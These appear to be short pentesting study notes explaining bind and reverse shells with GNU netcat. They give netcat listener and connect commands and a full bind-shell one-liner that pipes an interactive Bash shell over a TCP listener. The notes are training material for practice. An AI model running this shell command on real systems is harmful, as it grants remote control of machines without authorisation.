- **Bind &/or Reverse shell**: Used to control system on a local or remote network through its shell

### What Is It?
- **Target System** has a listener started and awaits a connection from a **pentester's system**

****
### Practicing with GNU Netcat
1. **Target Machine - Starting Netcat listener**
	- `nc -lnvp [any port]`
2. **Personal Machine - Connecting to target**
	- `nc -nv [target machine ip address] [target machine port]`

****
### Establishing a Basic Bind Shell with Netcat
1. **Target Machine - Binding a Bash shell to the TCP session**
	- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l [target machine ip address] [port] > /tmp/f`
2. **Personal Machine - Connecting to bind shell on target**
	- `nc -nv [target machine ip address] [target machine port]`
